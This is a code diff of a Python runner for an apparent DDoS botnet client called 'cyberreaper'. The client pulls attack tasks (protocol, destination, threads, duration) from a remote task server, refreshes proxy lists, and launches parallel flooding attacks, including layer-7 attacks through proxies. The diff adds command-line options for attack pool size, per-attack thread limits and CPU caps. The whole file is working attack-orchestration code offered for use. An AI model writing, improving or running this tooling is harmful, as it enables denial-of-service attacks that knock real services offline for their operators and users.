@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+import argparse
 import json
 import psutil
 import subprocess
@@ -7,23 +7,18 @@ import sys
 
 from collections import namedtuple
 from logging import basicConfig, getLogger
-from pathlib import Path
+from proxies import update_file
 from queue import Queue
 from socket import gethostname
-from sys import argv
 from threading import Thread
 from time import sleep
 from urllib.request import urlopen
 
-import MHDDoS.start as MHDDoS
-
-from proxies import update_file
-
-getLogger('proxies').setLevel("CRITICAL")
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
 
+getLogger('proxies').setLevel("CRITICAL")
 logger = getLogger("Bot Runner")
 logger.setLevel("INFO")
 
@@ -80,18 +75,19 @@ def customDecoder(Obj):
     return namedtuple('X', Obj.keys())(*Obj.values())
 
 
-def runner(config):
+def runner(config, cpu_limit, threads_limit=0):
     if int(config.Duration) > loop_time:
         period = loop_time
     else:
         period = config.Duration
+    cfg_threads = config.Threads if threads_limit <= 0 else threads_limit
     if config.UseProxy:
         if config.Proto in l7:
             params = [
                 str(config.Proto),
                 str(config.Dst),
                 str(config.ProxyType),
-                str(config.Threads if thread_limit <= 0 else thread_limit),
+                str(cfg_threads),
                 str(config.ProxyList),
                 str(config.RPC),
                 str(period)
@@ -100,7 +96,7 @@ def runner(config):
             params = [
                 str(config.Proto),
                 str(config.Dst),
-                str(config.Threads if thread_limit <= 0 else thread_limit),
+                str(cfg_threads),
                 str(period),
                 str(config.ProxyType),
                 str(config.ProxyList)
@@ -110,12 +106,13 @@ def runner(config):
             params = [
                 str(config.Proto),
                 str(config.Dst),
-                str(config.Threads if thread_limit <= 0 else thread_limit),
+                str(cfg_threads),
                 str(period)
             ]
         else:
             logger.info(
                 'No we cant run the LEVEL7 attacks without proxy. Skipping')
+            return
     try:
         cpu_usage = psutil.cpu_percent(4)
         while cpu_usage > cpu_limit:
@@ -132,10 +129,6 @@ def runner(config):
 
 if __name__ == '__main__':
 
-    pool_size = int(argv[1]) if len(argv) >= 2 else int(psutil.cpu_count() / 2)
-    thread_limit = int(argv[2]) if len(argv) >= 3 else 0
-    cpu_limit = int(argv[3]) if len(argv) >= 4 else 70
-
     logger.info('''
   ____      _               ____                         _   _   _   _    
  / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
@@ -144,8 +137,34 @@ if __name__ == '__main__':
  \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
       |___/                      |_|                    |_|               
 ''')
+    parser = argparse.ArgumentParser(prog="cyberreaper")
+    parser.add_argument("-a", "--max-attacks",
+                        action="store",
+                        required=False,
+                        type=int,
+                        default=psutil.cpu_count() // 2,
+                        help="Maximum amount of the attacks executed in parallel (attack pool size).")
+    parser.add_argument("-t", "--attack-threads-limit",
+                        action="store",
+                        required=False,
+                        type=int,
+                        default=0,
+                        help="Limit amount of the threads for every attack. If value >0, it overrules the "
+                             "attack's task configuration 'Threads' parameter provided that has higher "
+                             "value compared to this option's value.")
+    parser.add_argument("-c", "--cpu-limit",
+                        action="store",
+                        required=False,
+                        type=int,
+                        default=70,
+                        help="Limit the CPU usage by attacks to the specified value.")
 
-    logger.info(f"Task server {url}")
+    args = parser.parse_args()
+    pool_size = args.max_attacks
+    max_threads = args.attack_threads_limit
+    cpu_limit = args.cpu_limit
+
+    logger.info(f"Fetch tasks URL: {url}")
 
     try:
         pool = ThreadPool(pool_size)
@@ -153,17 +172,11 @@ if __name__ == '__main__':
         logger.info("Get fresh proxies. Please wait...")
         update_file()
 
-        #MHDDoS.threads = 10
-        #proxy_config = json.load(open("MHDDoS/config.json"))
-        #MHDDoS.handleProxyList(proxy_config, Path(
-        #    "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)
-
         while True:
-
             logger.info("Getting fresh tasks from the server!")
             try:
                 for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
-                    pool.add_task(runner, conf)
+                    pool.add_task(runner, conf, cpu_limit, threads_limit=max_threads)
                     sleep(loop_time / 4)
                 pool.wait_completion()
 
@@ -177,3 +190,4 @@ if __name__ == '__main__':
     except Exception as error:
         logger.critical(f"OOPS... We faced an issue: {error}")
         logger.info("Please restart the tool! Thanks")
+
